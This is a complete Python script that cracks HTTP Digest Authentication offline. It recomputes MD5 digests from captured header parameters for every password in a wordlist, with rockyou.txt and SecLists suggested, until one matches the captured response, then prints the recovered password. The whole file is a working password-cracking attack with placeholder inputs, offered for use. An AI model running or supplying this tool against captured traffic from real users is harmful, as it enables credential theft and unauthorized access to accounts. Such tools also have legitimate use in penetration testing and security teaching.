import hashlib
import os

def md5_hash(data):
    return hashlib.md5(data.encode()).hexdigest()

def digest_auth_bruteforce(username, realm, nonce, uri, method, response, qop, nc, cnonce, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print(f"Wordlist file '{wordlist_path}' does not exist.")
        return None, None

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
        for line in file:
            password = line.strip()
            
            # Step 1: Calculate HA1 = MD5(username:realm:password)
            ha1 = md5_hash(f"{username}:{realm}:{password}")
            
            # Step 2: Calculate HA2 = MD5(method:uri)
            ha2 = md5_hash(f"{method}:{uri}")
            
            # Step 3: Calculate the response = MD5(HA1:nonce:nc:cnonce:qop:HA2)
            calculated_response = md5_hash(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}")
            
            # Check if the calculated response matches the provided response
            if calculated_response == response:
                print(f"Found! Username: {username}, Password: {password}")
                return username, password

    print("Password not found in the wordlist.")
    return None, None

# Digest Authentication parameters (from the header)
username = "USERNAME"
realm = "REALM"
nonce = "NONCE"
uri = "URI"
method = "METHOD"
response = "RESPONSE"
qop = "QOP"
nc = "NC"
cnonce = "CNONCE"

# Replace this with the path to your wordlist file, e.g., "rockyou.txt" or a file from SecLists
wordlist_path = "PATH/TO/WORDLIST"

# Run the brute-force attack with the wordlist file
digest_auth_bruteforce(username, realm, nonce, uri, method, response, qop, nc, cnonce, wordlist_path)
